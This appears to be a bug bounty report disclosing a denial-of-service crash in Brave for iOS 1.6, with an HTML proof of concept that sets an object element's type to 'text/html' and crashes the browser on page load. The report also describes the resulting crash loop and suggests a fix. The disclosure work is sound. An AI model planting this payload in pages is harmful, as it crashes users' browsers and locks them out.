# DoS in Brave for iOS

> Metnew: was this crash exploitable? I don't know, but seems yes:  `0x000000010172f63c` - crash address. I didn't have much interest to investigate this crash for 80$.

## Summary

Attacker could initiate DoS during the page load.

## Products affected

1.6 (18.05.17.13)
Device iPhone 6s (iOS 11.3.1)

## Steps To Reproduce:

PoC:

```html
<body>
    <script>
        let o = document.body.appendChild(document.createElement('object'));
        // application/json or application/pdf are valid values too
        o.type = 'text/html' // <-- triggers DoS
    </script>
</body>
```

## Supporting Material/References

As I understood, Brave browser for iOS is a fork of Mozilla Firefox for iOS.
Firefox isn't vulnerable, what makes this bug eligible.

Crash log attached.
Screencast attached.

## Impact

The first page loaded after the browser crash is the crashed page. The PoC is immediate and doesn't require any additional interaction, so it could make browser broken, until the tab will be closed in offline mode.
I'll suggest to remember the crashed page and don't load it during the browser opening. It'll probably makes all DoS attacks less dangerous.

> I'm not sure that the trick with closing tab in offline is obvious for most users.
